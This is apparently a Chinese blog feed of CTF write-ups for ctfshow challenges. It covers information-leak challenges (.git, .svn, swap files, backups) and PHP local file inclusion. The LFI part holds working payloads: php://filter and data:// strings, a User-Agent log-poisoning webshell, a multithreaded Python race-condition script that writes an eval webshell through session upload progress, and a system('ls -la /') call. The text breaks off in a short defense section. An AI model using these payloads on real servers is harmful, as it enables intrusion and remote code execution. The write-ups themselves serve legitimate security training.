    <content type="html"><![CDATA[<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><strong>phps文件</strong>就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。直接访问&#x2F;index.phps即可获得php</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>www源码泄露</p><p>访问url&#x2F;<a href="http://www.zip,通过其源码泄露,发现index.php文件/">www.zip，通过其源码泄露，发现index.php文件</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>fl000g.txt里显示flag{flag_here}，尝试直接url&#x2F;fl000g.txt，得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。<br>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。</p><p>尝试&#x2F;.git得到flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>主流的版本控制器有git和svn，访问&#x2F;.svn得到flag</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件.</p><ul><li>第一次意外退出生成的是.swp</li><li>第二次意外退出生成的是.swo</li><li>第三次为.swn</li></ul><p>访问&#x2F;index.php.swp获得带有flag的文件</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问&#x2F;admin，弹出登陆界面，账号用admin，密码从网站里找</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问&#x2F;editor，是文件上传界面，点击文件空间，从var&#x2F;www&#x2F;html找到nothinghere，点进去是fl000g.txt，访问&#x2F;nothinghere&#x2F;fl000g.txt得到flag</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>登录界面找回密保问题，通过文章里的qq邮箱得到居住地，成功找回密码。</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问tz.php找到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫到backup.sql得到flag</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>玩101分给你flag</p></blockquote><p>找到js文件，看见大于100分输出的字符串，解码获得flag</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件从txt打开，虽然是乱码也可以搜到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2025/01/07/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2025/01/07/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/01/06/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/01/06/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p><p> <em><strong>Warning</strong>:  include(&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p> <em><strong>Warning</strong>:  include(): Failed opening ‘&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p><strong>路径问题</strong>：..&#x2F;..&#x2F;flag.php 是相对路径，表示”向上两级目录中的flag.php”</p><p><strong>安全机制</strong>：PHP的 open_basedir 限制会阻止访问系统文件（常见于CTF环境）</p><p><strong>路径转换</strong>：PHP将相对路径转为绝对路径时，超出允许范围的路径会被替换为 &#x2F;…&#x2F;（安全占位符）</p><p><strong>根本原因</strong>：实际路径可能是 &#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;flag.php → 解析为 &#x2F;flag.php（根目录），而服务器禁止访问根目录</p><p><strong>关键点</strong>：这不是文件不存在，而是路径被安全机制拦截</p><p><strong>2.&#x2F;?file&#x3D;flag.php 显示空白的原因:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// flag.php 实际内容</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ctfshow&#123;...&#125;&quot;</span>;  <span class="hljs-comment">// 没有输出语句！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>include机制</strong>：当包含 .php 文件时，PHP会执行其中的代码，而非显示源码</p><p><strong>执行而非读取</strong>：</p><p>​    include(“flag.php”) 会执行 $flag&#x3D;”…” 的赋值操作</p><p>​    但该文件没有 echo&#x2F;print 语句 → 无任何输出</p><p>​    赋值操作在内存中完成，浏览器不可见</p><p><strong>空白页面</strong> &#x3D; 包含成功 + 文件无输出内容</p><p><strong>3.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php成功的原因：</strong></p><p><strong>绕过执行</strong>：</p><p>​    php:&#x2F;&#x2F;filter 将文件视为数据流而非代码</p><p>​    resource&#x3D;flag.php 指定读取目标文件</p><p><strong>编码转换</strong>：</p><p>​    convert.base64-encode 对文件内容进行Base64编码</p><p>​    将二进制数据转为纯ASCII字符（A-Z a-z 0-9 +&#x3D;）</p><p><strong>安全输出</strong>：</p><p>​    编码后的内容不包含 <?php ?> 等标签</p><p>​    PHP引擎将其视为普通文本而非代码 → 直接输出到页面</p><p><strong>最终结果</strong>：</p><p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p><p>​    解码后得到原始代码</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p><p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p><p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p><p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以直接大小写绕过</p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p><p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p><p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p><h3 id="web82-条件竞争"><a href="#web82-条件竞争" class="headerlink" title="web82(条件竞争)"></a>web82(条件竞争)</h3><p>过滤了.</p><p>php中唯一能控制的无后缀的只有session文件</p><p><img src="/%5Cimages%5Cweb82-1.png"></p><p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p><p>控制文件内容用参数<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>(获取实时文件上传进度)</p><p>如PHP_SESSION_UPLOAD_PROGRESS&#x3D;”3” &#x3D;&gt; sess_aaa&#x3D;3</p><p><strong>file_put_contents() 函数</strong>：</p><ul><li>这是PHP的一个内置函数</li><li>作用：将内容写入文件（类似保存文件的操作）</li><li>语法：<code>file_put_contents(文件名, 要写入的内容)</code></li><li>示例：<code>file_put_contents(&#39;test.txt&#39;, &#39;Hello World&#39;)</code> 会创建一个test.txt文件，内容为”Hello World”</li></ul><p>写脚本（<strong>已经考虑到了先销毁再包含的情况）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data = &#123; <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="hljs-comment"># read()中需要post的内容</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>            data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        <span class="hljs-comment"># 改参数的值就是/tmp/sess_rikka文件的内容</span><br>            &#125;,<br>            cookies=&#123;<br>            <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid<br>            &#125;,<br>            files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123; <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid &#125;)<br>        res2 = session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event() <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure><p>50KB文件确保上传时间足够长（约几秒），这样攻击者有时间在文件被清空前利用它 </p><p>结果是+++done+++，说明成功，访问&#x2F;2.php，</p><p><img src="/%5Cimages%5Cweb82-2.png"></p><p>尝试post</p><p><img src="/%5Cimages%5Cweb82-3.png"></p><p>成功。下面详细讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br><span class="hljs-comment"># 目标网站的URL</span><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br><br><span class="hljs-comment"># 自定义的Session ID，用于控制Session文件名</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br><br><span class="hljs-comment"># 要执行的恶意PHP代码</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>data 解释</strong>：</p><ul><li><code>&quot;1&quot;</code>：这是POST参数名</li><li>值是一个PHP代码字符串：<code>file_put_contents(&#39;/var/www/html/2.php&#39;,&#39;&lt;?php eval($_POST[2]);?&gt;&#39;);</code></li><li>这行代码的意思是：在服务器的<code>/var/www/html/</code>目录创建<code>2.php</code>文件</li><li>文件内容：<code>&lt;?php eval($_POST[2]);?&gt;</code>（这是一个Webshell）</li><li><code>eval($_POST[2])</code> 表示执行通过POST参数<code>2</code>发送的任何PHP代码</li></ul><hr><h4 id="写线程函数（负责污染Session文件）"><a href="#写线程函数（负责污染Session文件）" class="headerlink" title="写线程函数（负责污染Session文件）"></a>写线程函数（负责污染Session文件）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-comment"># 创建一个50KB大小的&quot;假文件&quot;（内容全是字母a）</span><br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 发送POST请求上传文件</span><br>        res = session.post(<br>            url,  <span class="hljs-comment"># 目标URL</span><br>            <br>            <span class="hljs-comment"># POST数据部分</span><br>            data=&#123;<br>                <span class="hljs-comment"># 关键！这个值会被写入Session文件</span><br>                <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># Cookie设置</span><br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid  <span class="hljs-comment"># 设置Session ID</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># 上传的文件</span><br>            files=&#123;<br>                <span class="hljs-comment"># 文件字段名：&#x27;file&#x27;</span><br>                <span class="hljs-comment"># 文件名：&#x27;ctfshow.jpg&#x27;</span><br>                <span class="hljs-comment"># 文件内容：50KB的&#x27;a&#x27;</span><br>                <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>        )<br></code></pre></td></tr></table></figure><p><strong>为什么需要大文件？</strong></p><ul><li>PHP只在上传过程中保持Session文件打开</li><li>50KB文件确保上传时间足够长（约几秒）</li><li>这样攻击者有时间在文件被清空前利用它</li></ul><p><strong>Session文件如何被污染？</strong></p><ol><li>设置Cookie: <code>PHPSESSID=ctfshow</code></li><li>开始上传文件</li><li>PHP自动创建文件：<code>/tmp/sess_ctfshow</code></li><li>将<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值写入该文件</li><li>文件内容变为：<code>upload_progress_&lt;?php eval($_POST[1]);?&gt;</code></li></ol><hr><h4 id="读线程函数（负责执行恶意代码）"><a href="#读线程函数（负责执行恶意代码）" class="headerlink" title="读线程函数（负责执行恶意代码）"></a>读线程函数（负责执行恶意代码）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 第一步：触发文件包含漏洞执行恶意代码</span><br>        res1 = session.post(<br>            <span class="hljs-comment"># 利用文件包含漏洞：?file=/tmp/sess_ctfshow</span><br>            url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid,<br>            <br>            <span class="hljs-comment"># 发送要执行的代码</span><br>            data=data,  <span class="hljs-comment"># 就是前面定义的创建Webshell的代码</span><br>            <br>            cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid&#125;  <span class="hljs-comment"># 保持同一个Session</span><br>        )<br>        <br>        <span class="hljs-comment"># 第二步：检查Webshell是否创建成功</span><br> <br>        res2 = session.get(url + <span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 如果返回200状态码，说明文件存在</span><br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)  <span class="hljs-comment"># 成功提示</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)  <span class="hljs-comment"># 打印错误代码</span><br></code></pre></td></tr></table></figure><p><strong>攻击链解析</strong>：</p><ol><li>请求包含Session文件：<code>?file=/tmp/sess_ctfshow</code></li><li>服务器执行该文件中的PHP代码：<code>eval($_POST[1])</code></li><li><code>$_POST[1]</code>的值是我们发送的：<code>file_put_contents(...)</code></li><li>所以实际执行：<code>file_put_contents(&#39;/var/www/html/2.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;)</code></li><li>在网站根目录创建<code>2.php</code>，内容为Webshell代码</li></ol><hr><h4 id="多线程主程序"><a href="#多线程主程序" class="headerlink" title="多线程主程序"></a>多线程主程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 线程事件对象（实际未使用）</span><br>    <br>    <span class="hljs-comment"># 创建持久会话（自动管理cookies）</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 启动5个写线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <br>        <span class="hljs-comment"># 启动5个读线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    <br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置事件（实际未使用）</span><br></code></pre></td></tr></table></figure><p><strong>为什么需要多线程？</strong>（<strong>就算先删除临时目录再包含，也可以写进去shell</strong>)</p><ol><li><strong>竞争条件</strong>：Session文件在上传结束后会被PHP清空</li><li>写线程不断创建&#x2F;更新Session文件</li><li>读线程不断尝试在文件被清空前包含它</li><li>多个线程增加成功率（类似不断尝试开锁）</li></ol><hr><h3 id="Webshell使用示例"><a href="#Webshell使用示例" class="headerlink" title="Webshell使用示例"></a>Webshell使用示例</h3><p>成功创建<code>2.php</code>后，攻击者可以发送：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>目标网站<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">2</span>=system(<span class="hljs-string">&quot;ls -la /&quot;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure><p><strong>结果</strong>：</p><ul><li>服务器会执行<code>ls -la /</code>（列出根目录所有文件）</li><li>返回结果给攻击者</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br>...<br>total 123<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 .<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 ..<br>-rw-r--r--  1 root root    148 Aug 17  2022 .bashrc<br>...<br></code></pre></td></tr></table></figure><hr><h3 id="为什么这个攻击有效？"><a href="#为什么这个攻击有效？" class="headerlink" title="为什么这个攻击有效？"></a>为什么这个攻击有效？</h3><ol><li><p><strong>Session文件可控</strong>：</p><ul><li>唯一无需后缀即可写入PHP代码的地方</li><li>通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>控制内容</li></ul></li><li><p><strong>文件包含漏洞</strong>：</p><ul><li>网站有类似<code>include($_GET[&#39;file&#39;])</code>的代码</li><li>允许读取<code>/tmp/sess_xxx</code>文件</li></ul></li><li><p><strong>时间窗口利用</strong>：</p><ul><li>大文件上传延长Session文件存在时间</li><li>多线程不断尝试利用这个时间窗口</li></ul></li></ol><hr><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><p>关闭危险功能：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; php.ini 配置</span><br><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure></li><li><p>限制文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不要直接包含用户输入</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;header.php&#x27;</span>, <span class="hljs-string">&#x27;footer.php&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span 